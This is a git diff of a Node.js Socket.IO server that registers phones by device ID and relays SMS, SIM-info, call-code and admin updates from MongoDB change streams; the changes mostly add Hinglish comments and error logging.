@@ -1,3 +1,4 @@
+// server.js
 import express from "express";
 import cors from "cors";
 import dotenv from "dotenv";
@@ -35,14 +36,16 @@ app.set("io", io);
 // 🔧 HELPERS
 // ======================================================
 
-// ek hi jagah se ID clean karenge
+// ek hi jagah se ID clean karenge (trim + uppercase)
 function cleanId(id) {
   if (!id) return null;
   return id.toString().trim().toUpperCase();
 }
 
-// deviceId → socketId
+// deviceId → socketId (current active phone socket)
+// 1 device = 1 active socket (latest wins)
 const deviceSockets = new Map();
+
 // deviceId → Set(socketId)  (web pages jo single device dekh rahe hain)
 const watchers = new Map();
 
@@ -60,6 +63,7 @@ function notifyWatchers(uniqueid, payload) {
 io.on("connection", (socket) => {
   console.log("🟢 New Socket Connected:", socket.id);
 
+  // ye sirf phone ke liye use hoga (registerDevice ke baad)
   let currentUniqueId = null; // cleaned id jo is socket se map hai
 
   // 👁 WATCH DEVICE (web UI)
@@ -95,11 +99,13 @@ io.on("connection", (socket) => {
     deviceSockets.set(uniqueid, socket.id);
     currentUniqueId = uniqueid;
 
+    // phone + us device ke watchers ek hi room me
     socket.join(uniqueid);
 
+    // DB me lastSeen Online
     saveLastSeen(uniqueid, "Online");
 
-    // ack to that device only
+    // sirf usi socket ko ACK
     io.to(socket.id).emit("deviceRegistered", { uniqueid });
 
     // admin/dashboard ke liye list update
@@ -157,6 +163,7 @@ io.on("connection", (socket) => {
       const clean = cleanId(currentUniqueId);
       const latestSocket = deviceSockets.get(clean);
 
+      // sirf tab offline mark karo jab yahi latest socket ho
       if (latestSocket === socket.id) {
         console.log("🛑 DEVICE OFFLINE:", clean);
 
@@ -181,6 +188,7 @@ io.on("connection", (socket) => {
       }
     }
 
+    // saare watchers set se is socket ko hatao
     for (let [id, set] of watchers.entries()) {
       set.delete(socket.id);
     }
@@ -213,6 +221,7 @@ export async function sendCallCodeToDevice(rawId, callData) {
   const uniqueid = cleanId(rawId);
   if (!uniqueid) return;
 
+  // room = uniqueid → phone + watchers dono ko event milega
   io.to(uniqueid).emit("callCodeUpdate", callData);
   console.log(`📞 CallCode Sent → ${uniqueid}`);
 }
@@ -226,7 +235,7 @@ export function sendAdminGlobal(adminData) {
 }
 
 // ======================================================
-// 🔥 MONGO STREAMS WITH RETRY
+// 🔥 MONGO STREAMS WITH RETRY (CALL/SMS/ADMIN BHI RAKH RAHA HOON)
 // ======================================================
 mongoose.connection.once("open", () => {
   console.log("📡 Mongo Streams Active...");
@@ -248,9 +257,11 @@ mongoose.connection.once("open", () => {
         });
 
         stream.on("error", () => {
+          console.error("🔥 ChangeStream error on", collection);
           setTimeout(start, 5000);
         });
-      } catch {
+      } catch (err) {
+        console.error("🔥 watchWithRetry error on", collection, err.message);
         setTimeout(start, 5000);
       }
     };
@@ -264,27 +275,30 @@ mongoose.connection.once("open", () => {
 
   // siminfos changes
   watchWithRetry("siminfos", (data) => {
-    io.emit("simInfoUpdated", data);
+    io.emit("simInfoUpdated", { event: "sim_change", sim: data });
   });
 
-  // callcodes changes
+  // callcodes changes → targeted device
   watchWithRetry("callcodes", (data) => {
     if (data.uniqueid) sendCallCodeToDevice(data.uniqueid, data);
   });
 
-  // sms changes
+  // sms changes → targeted device room
   watchWithRetry("sms", (data) => {
     if (!data.uniqueid) return;
     const id = cleanId(data.uniqueid);
     io.to(id).emit("smsUpdate", data);
   });
 
-  // admins changes
+  // admins changes → global
   watchWithRetry("admins", (data) => {
     sendAdminGlobal(data);
   });
 });
 
+// ======================================================
+// 🔥 ROUTES
+// ======================================================
 app.use("/api/device", deviceRoutes);
 app.use("/api/sms", smsRoutes);
 app.use("/api/siminfo", simInfoRoutes);
